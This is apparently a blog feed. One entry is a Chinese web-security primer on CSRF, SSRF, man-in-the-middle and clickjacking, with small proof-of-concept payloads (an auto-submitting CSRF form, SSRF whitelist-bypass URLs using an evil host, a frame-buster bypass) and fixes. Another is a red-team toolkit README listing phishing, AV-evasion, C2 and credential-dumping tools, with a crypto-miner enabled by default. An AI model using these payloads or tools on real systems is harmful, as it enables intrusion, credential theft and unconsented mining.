&lt;input type="hidden" name="email" value="pwned@evil-user.net" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt; 如果受害用户访问攻击者的网页，则会发生以下情况： 攻击者的页面将触发对易受攻击的网站的HTTP请求。 如果用户登录到易受攻击的网站，则其浏览器将自动在请求中包括其会话cookie（假设未使用SameSite cookie）。 易受攻击的网站将以正常方式处理请求，将其视为受害用户提出，并更改其电子邮件地址。 修复建议 CSRF自动防御策略：同源检测（Origin和 Referer验证）。 利用SameSite Cookie属性。 CSRF主动防御措施：Token验证或者双重Cookie验证以及配合Samesite Cookie。 保证页面的幂等性，后端接口不要在GET页面中做用户操作。 基于用户交互的CSRF防御：重新认证（密码）、一次性令牌、验证码。 服务器端伪造请求（SSRF）漏洞描述 SSRF（Server-Side Request Forgery，服务端请求伪造）是一种由攻击者构造请求，由服务端发起的请求的安全漏洞。一般情况下，SSRF攻击的目标是外网无法访问的内部系统。 漏洞危害 成功利用SSRF攻击通常会导致易受攻击的应用程序本身或应用程序可以与之通信的其他后端系统上未经授权的操作或对组织内数据的访问。在某些情况下，SSRF漏洞可能允许攻击者执行任意命令执行。 导致与外部第三方系统建立连接的SSRF利用可能导致恶意的继续攻击。 攻击案例 检测方法 修复建议 禁止跳转。 过滤返回信息，验证远程服务器对请求的响应是比较容易的方法。如果Web应用是去获取某一种类型的文件。那么在把返回结果展示给用户之前先验证返回的信息是否符合标准。 禁用不需要的协议，仅仅允许http和https请求。可以防止类似于file://, gopher://, ftp:// 等引起的问题 设置URL白名单或者限制内网IP（使用gethostbyname()判断是否为内网IP） 限制请求的端口为http常用的端口，比如 80、443、8080、8090 统一错误信息，避免用户可以根据错误信息来判断远端服务器的端口状态。 黑名单过滤器： 阻止包含主机名（如127.0.0.1和localhost）。 阻止内网地址的访问（如192.168.x.x/10.x.x.x等）。 使用URL编码或大小写变化对阻塞的字符串进行混淆。 白名单过滤器： 使用@字符在主机名之前的URL中嵌入凭据。例如：https://expected-host@evil-host。 使用该#字符来指示URL片段。例如：https://evil-host#expected-host。 利用DNS命名层次结构将所需的输入放入您控制的标准DNS名称中。例如：https://expected-host.evil-host。 使用URL编码字符来混淆URL解析代码。如果实现过滤器的代码与执行后端HTTP请求的代码以不同的方式处理URL编码的字符，则这特别有用。 中间人攻击漏洞描述 中间人攻击（Man-in-the-Middle Attack, MITM）是一种由来已久的网络入侵手段，并且当今仍然有着广泛的发展空间，如SMB会话劫持、DNS欺骗等攻击都是典型的MITM攻击。简而言之，所谓的MITM攻击就是通过拦截正常的网络通信数据，并进行数据篡改和嗅探，而通信的双方却毫不知情。当黑客将自己插入客户端和服务器的通信之间时，就会发生MitM攻击。 中间人攻击常见类别：IP欺骗、DNS欺骗、ARP欺骗、HTTPS欺骗、SSL劫持、DNS劫持、电子邮件劫持、WIFI窃听、窃取浏览器Cookie、SSL剥离。 漏洞危害 一旦攻击者找到了易受攻击的路由器，他们便可以部署工具来拦截和读取受害者的传输数据。然后，攻击者还可以将其工具插入受害者的计算机和用户访问的网站之间，以捕获登录凭据，银行信息和其他个人信息。 成功利用中间人攻击的攻击者可以窃取用户的敏感信息、挂马等。 攻击案例 场景1：会话劫持： 在这种MitM攻击中，攻击者劫持了受信任的客户端和网络服务器之间的会话。当服务器继续会话时，攻击计算机将其IP地址替换为受信任的客户端，认为它正在与客户端进行通信。例如，攻击可能会像这样展开： 1.客户端连接到服务器。 2.攻击者的计算机控制了客户端。 3.攻击者的计算机将客户端与服务器断开连接。 4.攻击者的计算机用其自己的IP地址替换客户端的IP地址，并欺骗客户端的序列号。 5.攻击者的计算机继续与服务器对话，并且服务器认为服务器仍在与客户端通信。 检测方法 中间人攻击常见攻击工具： dsniff —— 一个实现SSH和SSL中间人攻击的工具 Cain and Abel —— Windows图形界面的工具，它可以执行中间人攻击，嗅探和ARP投毒 Ettercap —— 一个基于局域网的中间人攻击工具 Karma —— 一个使用802.11 Evil Twin以执行MITM攻击的工具 AirJack —— 一个演示802.11 MITM攻击的工具 SSLStrip—— 一个基于SSL的MITM攻击的工具 SSLSniff—— 一个基于SSL的MITM攻击的工具。原本是利用一个在Internet Explorer上缺陷实现的。 csploit —— 一个在android系统上实现的MITM攻击工具包。 Mallory —— 一个透明的TCP和UDP MiTMing代理。扩展到MITM SSL，SSH和许多其他协议。 wsniff —— 一个802.11 HTTP/HTTPS的基于MITM攻击的工具 修复建议 接入更安全的加密协议WEP/WAP的无线网络 无线访问点具有强大的加密机制，可以防止有害用户仅在附近就可以加入您的网络。弱的加密机制可以使攻击者以暴力方式进入网络并开始中间人攻击。加密实施越强，就越安全。 设置更安全的路由器登录凭证 确保更改默认路由器登录名。不仅是Wi-Fi密码，还有路由器管理界面的登录凭据。如果攻击者找到了路由器登录凭据，则他们可以将DNS服务器更改为恶意服务器。甚至使用恶意软件感染路由器。 使用虚拟专用网 VPN可用于为局域网内的敏感信息创建安全的环境。他们使用基于密钥的加密来创建用于安全通信的子网。这样，即使攻击者碰巧进入共享的网络，他也将无法破译VPN中的流量。 强制使用HTTPS HTTPS可用于使用公私密钥交换通过HTTP安全地进行通信。这样可以防止攻击者利用它正在嗅探的数据。网站应仅使用HTTPS，而不应提供HTTP替代方法。用户可以安装浏览器插件以始终对请求使用HTTPS来强制实施。 基于公钥对的身份验证 中间人攻击通常涉及欺骗某物或另一物。可以在堆栈的各个层中使用基于公共密钥对的身份验证（例如RSA），以帮助确保正在与之通信的对象是否确实是要与之通信的对象。 点击劫持漏洞描述 点击劫持（Click Jacking）是一种视觉上的欺骗手段，攻击者通过使用一个透明的iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，通过调整iframe页面的位置，可以使得伪造的页面恰好和iframe里受害页面里一些功能重合（按钮），以达到窃取用户信息或者劫持用户操作的目的。 漏洞危害 成功利用此漏洞攻击者可以窃取用户敏感信息。 攻击案例 场景1：从Google Chrome 4.0和IE8开始，引入了XSS过滤器，以保护用户免受反射的XSS攻击。Nava和Lindsay已经观察到，这类过滤器可以伪装成恶意代码，从而用于停用帧无效代码。 示例：目标网页框架无效代码： 123456&lt;script&gt; if ( top != self ) &#123; top.location=self.location; &#125;&lt;/script&gt; 攻击者代码： 1&lt;iframe src=”http://target.com/?param=&lt;script&gt;if”&gt; 检测方法 测试人员可以通过创建一个简单的网页（包括包含目标网页的框架）来测试目标网页是否可以加载到嵌入式框架中。以下代码段显示了用于创建此测试网页的HTML代码示例： 12345678&lt;html&gt; &lt;head&gt; &lt;title&gt;Clickjack test page&lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;iframe src="http://www.target.site" width="500" height="500"&gt;&lt;/iframe&gt; &lt;/body&gt;&lt;/html&gt; 如果将http://www.target.site页面成功加载到框架中，则该站点容易受到攻击，并且没有针对点击劫持攻击的保护措施。 OWASP检测方法： https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html 修复建议 可以使用三种主要机制来防御这些攻击： 禁止浏览器使用X-Frame-Options或内容安全策略(frame-ancestors) HTTP标头在框架中加载页面。 使用SameSite cookie属性将页面加载到框架中时，防止包含会话cookie 。 在页面中实现JavaScript代码以尝试防止将其加载到框架中。 基于内容安全策略（CSP）防止点击劫持，以下CSP仅将框架列入白名单： 为了防止内容的所有框架使用： Content-Security-Policy: frame-ancestors &#39;none&#39;; 要允许网站本身使用，请使用： Content-Security-Policy: frame-ancestors &#39;self&#39;; 要允许信任域，请执行以下操作： Content-Security-Policy: frame-ancestors trusted.com;]]></content>
      <categories>
        <category>安全知识</category>
      </categories>
      <tags>
        <tag>安全知识</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[linux 常用命令]]></title>
    <url>%2F2019%2F04%2F08%2FLinux%20command.html</url>
    <content type="text"><![CDATA[Linux 常用命令操作 温故而知新 12kill -9 `ps -ef|grep apache2|grep -v grep|awk &apos;&#123;print $2&#125;&apos; `指定进程名执行 kill命令]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redteam Toolkit]]></title>
    <url>%2F2019%2F04%2F07%2FRedteam%20Toolkit.html</url>
    <content type="text"><![CDATA[This tool kit is very much influenced by infosecn1nja’s kit.Use this script to grab majority of the repos. NOTE: hard coded in /opt and made for Kali Linux Total Size (so far): 2.5+Gb Install Guide:123git clone https://github.com/shr3ddersec/Shr3dKit.gitpip install -r requirements.txtbash shr3dkit.sh Change Log1234Fixed: macro_pack, LaZagneCode: Added all requirements to script, seperated pip requirements and merged to one file.Tools Added: Modlishka, pwndb, cat-sites, Phantom-Evasion Phantom Evasion Forewarning Currently pursuing a permanent an IT Sec role, for personal budgeting I added this tool as does a fantastic job for AV Evasion without opening up your wallet. Keep in mind, this does have crypto miner (xmr-stak) installer option. I kept the complete install out of script purposely for this reason. To disable, please change Miner=False in Setup/Config.txt then run the script. You may always keep it on to help the devs, such as myself in my home lab. Contents Reconnaissance Weaponization Delivery Command and Control Lateral Movement Establish Foothold Escalate Privileges Data Exfiltration Misc References ReconnaissanceActive Intelligence Gathering EyeWitness is designed to take screenshots of websites, provide some server header info, and identify default credentials if possible. https://github.com/ChrisTruncer/EyeWitness AWSBucketDump is a tool to quickly enumerate AWS S3 buckets to look for loot. https://github.com/jordanpotti/AWSBucketDump AQUATONE is a set of tools for performing reconnaissance on domain names. https://github.com/michenriksen/aquatone spoofcheck a program that checks if a domain can be spoofed from. The program checks SPF and DMARC records for weak configurations that allow spoofing. https://github.com/BishopFox/spoofcheck Nmap is used to discover hosts and services on a computer network, thus building a “map” of the network. https://github.com/nmap/nmap dnsrecon a tool DNS Enumeration Script. https://github.com/darkoperator/dnsrecon Passive Intelligence Gathering Social Mapper OSINT Social Media Mapping Tool, takes a list of names &amp; images (or LinkedIn company name) and performs automated target searching on a huge scale across multiple social media sites. Not restricted by APIs as it instruments a browser using Selenium. Outputs reports to aid in correlating targets across sites. https://github.com/SpiderLabs/social_mapper skiptracer OSINT scraping framework, utilizes some basic python webscraping (BeautifulSoup) of PII paywall sites to compile passive information on a target on a ramen noodle budget. https://github.com/xillwillx/skiptracer ScrapedIn a tool to scrape LinkedIn without API restrictions for data reconnaissance. https://github.com/dchrastil/ScrapedIn linkScrape A LinkedIn user/company enumeration tool. https://github.com/NickSanzotta/linkScrape FOCA (Fingerprinting Organizations with Collected Archives) is a tool used mainly to find metadata and hidden information in the documents its scans. https://github.com/ElevenPaths/FOCA theHarvester is a tool for gathering subdomain names, e-mail addresses, virtualhosts, open ports/ banners, and employee names from different public sources. https://github.com/laramies/theHarvester Metagoofil is a tool for extracting metadata of public documents (pdf,doc,xls,ppt,etc) availables in the target websites. https://github.com/laramies/metagoofil SimplyEmail Email recon made fast and easy, with a framework to build on. https://github.com/killswitch-GUI/SimplyEmail truffleHog searches through git repositories for secrets, digging deep into commit history and branches. https://github.com/dxa4481/truffleHog Just-Metadata is a tool that gathers and analyzes metadata about IP addresses. It attempts to find relationships between systems within a large dataset. https://github.com/ChrisTruncer/Just-Metadata typofinder a finder of domain typos showing country of IP address. https://github.com/nccgroup/typofinder pwnedOrNot is a python script which checks if the email account has been compromised in a data breach, if the email account is compromised it proceeds to find passwords for the compromised account. https://github.com/thewhiteh4t/pwnedOrNot GitHarvester This tool is used for harvesting information from GitHub like google dork. https://github.com/metac0rtex/GitHarvester pwndb is a python command-line tool for searching leaked credentials using the Onion service with the same name. https://github.com/davidtavarez/pwndb/ Frameworks Maltego is a unique platform developed to deliver a clear threat picture to the environment that an organization owns and operates. https://www.paterva.com/web7/downloads.php SpiderFoot the open source footprinting and intelligence-gathering tool. https://github.com/smicallef/spiderfoot datasploit is an OSINT Framework to perform various recon techniques on Companies, People, Phone Number, Bitcoin Addresses, etc., aggregate all the raw data, and give data in multiple formats. https://github.com/DataSploit/datasploit Recon-ng is a full-featured Web Reconnaissance framework written in Python. https://bitbucket.org/LaNMaSteR53/recon-ng Weaponization Composite Moniker Proof of Concept exploit for CVE-2017-8570. https://github.com/rxwx/CVE-2017-8570 Exploit toolkit CVE-2017-8759 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft .NET Framework RCE. https://github.com/bhdresh/CVE-2017-8759 CVE-2017-11882 Exploit accepts over 17k bytes long command/code in maximum. https://github.com/unamer/CVE-2017-11882 Adobe Flash Exploit CVE-2018-4878. https://github.com/anbai-inc/CVE-2018-4878 Exploit toolkit CVE-2017-0199 is a handy python script which provides pentesters and security researchers a quick and effective way to test Microsoft Office RCE. https://github.com/bhdresh/CVE-2017-0199 demiguise is a HTA encryption tool for RedTeams. https://github.com/nccgroup/demiguise Office-DDE-Payloads collection of scripts and templates to generate Office documents embedded with the DDE, macro-less command execution technique. https://github.com/0xdeadbeefJERKY/Office-DDE-Payloads CACTUSTORCH Payload Generation for Adversary Simulations. https://github.com/mdsecactivebreach/CACTUSTORCH SharpShooter is a payload creation framework for the retrieval and execution of arbitrary CSharp source code. https://github.com/mdsecactivebreach/SharpShooter Don’t kill my cat is a tool that generates obfuscated shellcode that is stored inside of polyglot images. The image is 100% valid and also 100% valid shellcode. https://github.com/Mr-Un1k0d3r/DKMC Malicious Macro Generator Utility Simple utility design to generate obfuscated macro that also include a AV / Sandboxes escape mechanism. https://github.com/Mr-Un1k0d3r/MaliciousMacroGenerator SCT Obfuscator Cobalt Strike SCT payload obfuscator. https://github.com/Mr-Un1k0d3r/SCT-obfuscator Invoke-Obfuscation PowerShell Obfuscator. https://github.com/danielbohannon/Invoke-Obfuscation Invoke-DOSfuscation cmd.exe Command Obfuscation Generator &amp; Detection Test Harness. https://github.com/danielbohannon/Invoke-DOSfuscation morphHTA Morphing Cobalt Strike’s evil.HTA. https://github.com/vysec/morphHTA Unicorn is a simple tool for using a PowerShell downgrade attack and inject shellcode straight into memory. https://github.com/trustedsec/unicorn Shellter is a dynamic shellcode injection tool, and the first truly dynamic PE infector ever created. https://www.shellterproject.com/ EmbedInHTML Embed and hide any file in an HTML file. https://github.com/Arno0x/EmbedInHTML SigThief Stealing Signatures and Making One Invalid Signature at a Time. https://github.com/secretsquirrel/SigThief Veil is a tool designed to generate metasploit payloads that bypass common anti-virus solutions. https://github.com/Veil-Framework/Veil CheckPlease Sandbox evasion modules written in PowerShell, Python, Go, Ruby, C, C#, Perl, and Rust. https://github.com/Arvanaghi/CheckPlease Invoke-PSImage is a tool to embeded a PowerShell script in the pixels of a PNG file and generates a oneliner to execute. https://github.com/peewpw/Invoke-PSImage LuckyStrike a PowerShell based utility for the creation of malicious Office macro documents. To be used for pentesting or educational purposes only. https://github.com/curi0usJack/luckystrike ClickOnceGenerator Quick Malicious ClickOnceGenerator for Red Team. The default application a simple WebBrowser widget that point to a website of your choice. https://github.com/Mr-Un1k0d3r/ClickOnceGenerator macro_pack is a tool by @EmericNasi used to automatize obfuscation and generation of MS Office documents, VB scripts, and other formats for pentest, demo, and social engineering assessments. https://github.com/sevagas/macro_pack StarFighters a JavaScript and VBScript Based Empire Launcher. https://github.com/Cn33liz/StarFighters nps_payload this script will generate payloads for basic intrusion detection avoidance. It utilizes publicly demonstrated techniques from several different sources. https://github.com/trustedsec/nps_payload SocialEngineeringPayloads a collection of social engineering tricks and payloads being used for credential theft and spear phishing attacks. https://github.com/bhdresh/SocialEngineeringPayloads The Social-Engineer Toolkit is an open-source penetration testing framework designed for social engineering. https://github.com/trustedsec/social-engineer-toolkit Phishery is a Simple SSL Enabled HTTP server with the primary purpose of phishing credentials via Basic Authentication. https://github.com/ryhanson/phishery PowerShdll run PowerShell with rundll32. Bypass software restrictions. https://github.com/p3nt4/PowerShdll Ultimate AppLocker ByPass List The goal of this repository is to document the most common techniques to bypass AppLocker. https://github.com/api0cradle/UltimateAppLockerByPassList Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. https://github.com/sensepost/ruler Generate-Macro is a standalone PowerShell script that will generate a malicious Microsoft Office document with a specified payload and persistence method. https://github.com/enigma0x3/Generate-Macro Malicious Macro MSBuild Generator Generates Malicious Macro and Execute Powershell or Shellcode via MSBuild Application Whitelisting Bypass. https://github.com/infosecn1nja/MaliciousMacroMSBuild Meta Twin is designed as a file resource cloner. Metadata, including digital signature, is extracted from one file and injected into another. https://github.com/threatexpress/metatwin WePWNise generates architecture independent VBA code to be used in Office documents or templates and automates bypassing application control and exploit mitigation software. https://github.com/mwrlabs/wePWNise DotNetToJScript a tool to create a JScript file which loads a .NET v2 assembly from memory. https://github.com/tyranid/DotNetToJScript PSAmsi is a tool for auditing and defeating AMSI signatures. https://github.com/cobbr/PSAmsi Reflective DLL injection is a library injection technique in which the concept of reflective programming is employed to perform the loading of a library from memory into a host process. https://github.com/stephenfewer/ReflectiveDLLInjection ps1encode use to generate and encode a powershell based metasploit payloads. https://github.com/CroweCybersecurity/ps1encode Worse PDF turn a normal PDF file into malicious. Use to steal Net-NTLM Hashes from windows machines. https://github.com/3gstudent/Worse-PDF SpookFlare has a different perspective to bypass security measures and it gives you the opportunity to bypass the endpoint countermeasures at the client-side detection and network-side detection. https://github.com/hlldz/SpookFlare GreatSCT is an open source project to generate application white list bypasses. This tool is intended for BOTH red and blue team. https://github.com/GreatSCT/GreatSCT nps running powershell without powershell. https://github.com/Ben0xA/nps Meterpreter_Paranoid_Mode.sh allows users to secure your staged/stageless connection for Meterpreter by having it check the certificate of the handler it is connecting to. https://github.com/r00t-3xp10it/Meterpreter_Paranoid_Mode-SSL The Backdoor Factory (BDF) is to patch executable binaries with user desired shellcode and continue normal execution of the prepatched state. https://github.com/secretsquirrel/the-backdoor-factory MacroShop a collection of scripts to aid in delivering payloads via Office Macros. https://github.com/khr0x40sh/MacroShop UnmanagedPowerShell Executes PowerShell from an unmanaged process. https://github.com/leechristensen/UnmanagedPowerShell evil-ssdp Spoof SSDP replies to phish for NTLM hashes on a network. Creates a fake UPNP device, tricking users into visiting a malicious phishing page. https://gitlab.com/initstring/evil-ssdp Ebowla Framework for Making Environmental Keyed Payloads. https://github.com/Genetic-Malware/Ebowla make-pdf-embedded a tool to create a PDF document with an embedded file. https://github.com/DidierStevens/DidierStevensSuite/blob/master/make-pdf-embedded.py avet (AntiVirusEvasionTool) is targeting windows machines with executable files using different evasion techniques. https://github.com/govolution/avet Phantom-Evasion Interactive antivirus evasion tool written in python capable to generate (almost) FUD executable even with the most common 32 bit msfvenom payload (lower detection ratio with 64 bit payloads). https://github.com/oddcod3/Phantom-Evasion WARNING: Please be aware this does install a Minero miner by default. This can be changed in the Setup folder and edit Config.txt and edit Mining = False. If you want to support the project and developers, I would recommend keeping on. DeliveryPhishing King Phisher is a tool for testing and promoting user awareness by simulating real world phishing attacks. https://github.com/securestate/king-phisher FiercePhish is a full-fledged phishing framework to manage all phishing engagements. It allows you to track separate phishing campaigns, schedule sending of emails, and much more. https://github.com/Raikia/FiercePhish ReelPhish is a Real-Time Two-Factor Phishing Tool. https://github.com/fireeye/ReelPhish/ Gophish is an open-source phishing toolkit designed for businesses and penetration testers. It provides the ability to quickly and easily setup and execute phishing engagements and security awareness training. https://github.com/gophish/gophish CredSniper is a phishing framework written with the Python micro-framework Flask and Jinja2 templating which supports capturing 2FA tokens. https://github.com/ustayready/CredSniper PwnAuth a web application framework for launching and managing OAuth abuse campaigns. https://github.com/fireeye/PwnAuth Phishing Frenzy Ruby on Rails Phishing Framework. https://github.com/pentestgeek/phishing-frenzy Phishing Pretexts a library of pretexts to use on offensive phishing engagements. https://github.com/L4bF0x/PhishingPretexts Modlishka is a flexible and powerful reverse proxy, that will take your ethical phishing campaigns to the next level. https://github.com/drk1wi/Modlishka Watering Hole Attack BeEF is short for The Browser Exploitation Framework. It is a penetration testing tool that focuses on the web browser. https://github.com/beefproject/beef Command and ControlRemote Access Tools Cobalt Strike is software for Adversary Simulations and Red Team Operations. https://cobaltstrike.com/ Empire is a post-exploitation framework that includes a pure-PowerShell2.0 Windows agent, and a pure Python 2.6/2.7 Linux/OS X agent. https://github.com/EmpireProject/Empire Metasploit Framework is a computer security project that provides information about security vulnerabilities and aids in penetration testing and IDS signature development. https://github.com/rapid7/metasploit-framework SILENTTRINITY A post-exploitation agent powered by Python, IronPython, C#/.NET. https://github.com/byt3bl33d3r/SILENTTRINITY Pupy is an opensource, cross-platform (Windows, Linux, OSX, Android) remote administration and post-exploitation tool mainly written in python. https://github.com/n1nj4sec/pupy Koadic or COM Command &amp; Control, is a Windows post-exploitation rootkit similar to other penetration testing tools such as Meterpreter and Powershell Empire. https://github.com/zerosum0x0/koadic PoshC2 is a proxy aware C2 framework written completely in PowerShell to aid penetration testers with red teaming, post-exploitation and lateral movement. https://github.com/nettitude/PoshC2 Gcat a stealthy Python based backdoor that uses Gmail as a command and control server. https://github.com/byt3bl33d3r/gcat TrevorC2 is a legitimate website (browsable) that tunnels client/server communications for covert command execution. https://github.com/trustedsec/trevorc2 Merlin is a cross-platform post-exploitation HTTP/2 Command &amp; Control server and agent written in golang. https://github.com/Ne0nd0g/merlin Quasar is a fast and light-weight remote administration tool coded in C#. Providing high stability and an easy-to-use user interface, Quasar is the perfect remote administration solution for you. https://github.com/quasar/QuasarRAT Staging Rapid Attack Infrastructure (RAI) Red Team Infrastructure… Quick… Fast… SimplifiedOne of the most tedious phases of a Red Team Operation is usually the infrastructure setup. This usually entailsa teamserver or controller, domains, redirectors, and a Phishing server. https://github.com/obscuritylabs/RAI Red Baron is a set of modules and custom/third-party providers for Terraform which tries to automate creating resilient, disposable, secure and agile infrastructure for Red Teams. https://github.com/byt3bl33d3r/Red-Baron EvilURL generate unicode evil domains for IDN Homograph Attack and detect them. https://github.com/UndeadSec/EvilURL Domain Hunter checks expired domains, bluecoat categorization, and Archive.org history to determine good candidates for phishing and C2 domain names. https://github.com/threatexpress/domainhunter PowerDNS is a simple proof of concept to demonstrate the execution of PowerShell script using DNS only. https://github.com/mdsecactivebreach/PowerDNS Chameleon a tool for evading Proxy categorisation. https://github.com/mdsecactivebreach/Chameleon CatMyFish Search for categorized domain that can be used during red teaming engagement. Perfect to setup whitelisted domain for your Cobalt Strike beacon C&amp;C. https://github.com/Mr-Un1k0d3r/CatMyFish Malleable C2 is a domain specific language to redefine indicators in Beacon’s communication. https://github.com/rsmudge/Malleable-C2-Profiles Malleable-C2-Randomizer This script randomizes Cobalt Strike Malleable C2 profiles through the use of a metalanguage, hopefully reducing the chances of flagging signature-based detection controls. https://github.com/bluscreenofjeff/Malleable-C2-Randomizer FindFrontableDomains search for potential frontable domains. https://github.com/rvrsh3ll/FindFrontableDomains Postfix-Server-Setup Setting up a phishing server is a very long and tedious process. It can take hours to setup, and can be compromised in minutes. https://github.com/n0pe-sled/Postfix-Server-Setup DomainFrontingLists a list of Domain Frontable Domains by CDN. https://github.com/vysec/DomainFrontingLists Apache2-Mod-Rewrite-Setup Quickly Implement Mod-Rewrite in your infastructure. https://github.com/n0pe-sled/Apache2-Mod-Rewrite-Setup mod_rewrite rule to evade vendor sandboxes. https://gist.github.com/curi0usJack/971385e8334e189d93a6cb4671238b10 external_c2 framework a python framework for usage with Cobalt Strike’s External C2. https://github.com/Und3rf10w/external_c2_framework ExternalC2 a library for integrating communication channels with the Cobalt Strike External C2 server. https://github.com/ryhanson/ExternalC2 cs2modrewrite a tools for convert Cobalt Strike profiles to modrewrite scripts. https://github.com/threatexpress/cs2modrewrite e2modrewrite a tools for convert Empire profiles to Apache modrewrite scripts. https://github.com/infosecn1nja/e2modrewrite redi automated script for setting up CobaltStrike redirectors (nginx reverse proxy, letsencrypt). https://github.com/taherio/redi Domain Fronting Google App Engine. https://github.com/redteam-cyberark/Google-Domain-fronting DomainFrontDiscover Scripts and results for finding domain frontable CloudFront domains. https://github.com/peewpw/DomainFrontDiscover Automated Empire Infrastructure https://github.com/bneg/RedTeam-Automation Serving Random Payloads with NGINX. https://gist.github.com/jivoi/a33ace2e25515a31aa2ffbae246d98c9 meek is a blocking-resistant pluggable transport for Tor. It encodes adata stream as a sequence of HTTPS requests and responses. https://github.com/arlolra/meek CobaltStrike-ToolKit Some useful scripts for CobaltStrike. https://github.com/killswitch-GUI/CobaltStrike-ToolKit mkhtaccess_red Auto-generate an HTaccess for payload delivery – automatically pulls ips/nets/etc from known sandbox companies/sources that have been seen before, and redirects them to a benign payload. https://github.com/violentlydave/mkhtaccess_red RedFile a flask wsgi application that serves files with intelligence, good for serving conditional RedTeam payloads. https://github.com/outflanknl/RedFile keyserver Easily serve HTTP and DNS keys for proper payload protection. https://github.com/leoloobeek/keyserver DoHC2 allows the ExternalC2 library from Ryan Hanson (https://github.com/ryhanson/ExternalC2) to be leveraged for command and control (C2) via DNS over HTTPS (DoH). This is built for the popular Adversary Simulation and Red Team Operations Software Cobalt Strike (https://www.cobaltstrike.com). https://github.com/SpiderLabs/DoHC2 cat-sites Library of sites for categorization. https://github.com/audrummer15/cat-sites Lateral Movement CrackMapExec is a swiss army knife for pentesting networks. https://github.com/byt3bl33d3r/CrackMapExec PowerLessShell rely on MSBuild.exe to remotely execute PowerShell scripts and commands without spawning powershell.exe. https://github.com/Mr-Un1k0d3r/PowerLessShell GoFetch is a tool to automatically exercise an attack plan generated by the BloodHound application. https://github.com/GoFetchAD/GoFetch ANGRYPUPPY a bloodhound attack path automation in CobaltStrike. https://github.com/vysec/ANGRYPUPPY DeathStar is a Python script that uses Empire’s RESTful API to automate gaining Domain Admin rights in Active Directory environments using a variety of techinques. https://github.com/byt3bl33d3r/DeathStar SharpHound C# Rewrite of the BloodHound Ingestor. https://github.com/BloodHoundAD/SharpHound BloodHound.py is a Python based ingestor for BloodHound, based on Impacket. https://github.com/fox-it/BloodHound.py Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting NTLMv1/NTLMv2/LMv2, Extended Security NTLMSSP and Basic HTTP authentication. https://github.com/SpiderLabs/Responder SessionGopher is a PowerShell tool that uses WMI to extract saved session information for remote access tools such as WinSCP, PuTTY, SuperPuTTY, FileZilla, and Microsoft Remote Desktop. It can be run remotely or locally. https://github.com/fireeye/SessionGopher PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment. https://github.com/PowerShellMafia/PowerSploit Nishang is a framework and collection of scripts and payloads which enables usage of PowerShell for offensive security, penetration testing and red teaming. Nishang is useful during all phases of penetration testing. https://github.com/samratashok/nishang Inveigh is a Windows PowerShell LLMNR/mDNS/NBNS spoofer/man-in-the-middle tool. https://github.com/Kevin-Robertson/Inveigh PowerUpSQL a PowerShell Toolkit for Attacking SQL Server. https://github.com/NetSPI/PowerUpSQL MailSniper is a penetration testing tool for searching through email in a Microsoft Exchange environment for specific terms (passwords, insider intel, network architecture information, etc.). https://github.com/dafthack/MailSniper WMIOps is a powershell script that uses WMI to perform a variety of actions on hosts, local or remote, within a Windows environment. It’s designed primarily for use on penetration tests or red team engagements. https://github.com/ChrisTruncer/WMIOps Mimikatz is an open-source utility that enables the viewing of credential information from the Windows lsass. https://github.com/gentilkiwi/mimikatz LaZagne project is an open source application used to retrieve lots of passwords stored on a local computer. https://github.com/AlessandroZ/LaZagne mimipenguin a tool to dump the login password from the current linux desktop user. Adapted from the idea behind the popular Windows tool mimikatz. https://github.com/huntergregal/mimipenguin PsExec is a light-weight telnet-replacement that lets you execute processes on other systems, complete with full interactivity for console applications, without having to manually install client software. https://docs.microsoft.com/en-us/sysinternals/downloads/psexec KeeThief allows for the extraction of KeePass 2.X key material from memory, as well as the backdooring and enumeration of the KeePass trigger system. https://github.com/HarmJ0y/KeeThief PSAttack combines some of the best projects in the infosec powershell community into a self contained custom PowerShell console. https://github.com/jaredhaight/PSAttack Internal Monologue Attack Retrieving NTLM Hashes without Touching LSASS. https://github.com/eladshamir/Internal-Monologue Impacket is a collection of Python classes for working with network protocols. Impacket is focused on providing low-level programmatic access to the packets and for some protocols (for instance NMB, SMB1-3 and MS-DCERPC) the protocol implementation itself. https://github.com/CoreSecurity/impacket icebreaker gets plaintext Active Directory credentials if you’re on the internal network but outside the AD environment. https://github.com/DanMcInerney/icebreaker Living Off The Land Binaries and Scripts (and now also Libraries) The goal of these lists are to document every binary, script and library that can be used for other purposes than they are designed to. https://github.com/api0cradle/LOLBAS WSUSpendu for compromised WSUS server to extend the compromise to clients. https://github.com/AlsidOfficial/WSUSpendu Evilgrade is a modular framework that allows the user to take advantage of poor upgrade implementations by injecting fake updates. https://github.com/infobyte/evilgrade NetRipper is a post exploitation tool targeting Windows systems which uses API hooking in order to intercept network traffic and encryption related functions from a low privileged user, being able to capture both plain-text traffic and encrypted traffic before encryption/after decryption. https://github.com/NytroRST/NetRipper LethalHTA Lateral Movement technique using DCOM and HTA. https://github.com/codewhitesec/LethalHTA Invoke-PowerThIEf an Internet Explorer Post Exploitation library. https://github.com/nettitude/Invoke-PowerThIEf RedSnarf is a pen-testing / red-teaming tool for Windows environments. https://github.com/nccgroup/redsnarf HoneypotBuster Microsoft PowerShell module designed for red teams that can be used to find honeypots and honeytokens in the network or at the host. https://github.com/JavelinNetworks/HoneypotBuster Establish Foothold Tunna is a set of tools which will wrap and tunnel any TCP communication over HTTP. It can be used to bypass network restrictions in fully firewalled environments. https://github.com/SECFORCE/Tunna reGeorg the successor to reDuh, pwn a bastion webserver and create SOCKS proxies through the DMZ. Pivot and pwn. https://github.com/sensepost/reGeorg Blade is a webshell connection tool based on console, currently under development and aims to be a choice of replacement of Chooper. https://github.com/wonderqs/Blade TinyShell Web Shell Framework. https://github.com/threatexpress/tinyshell PowerLurk is a PowerShell toolset for building malicious WMI Event Subsriptions. https://github.com/Sw4mpf0x/PowerLurk 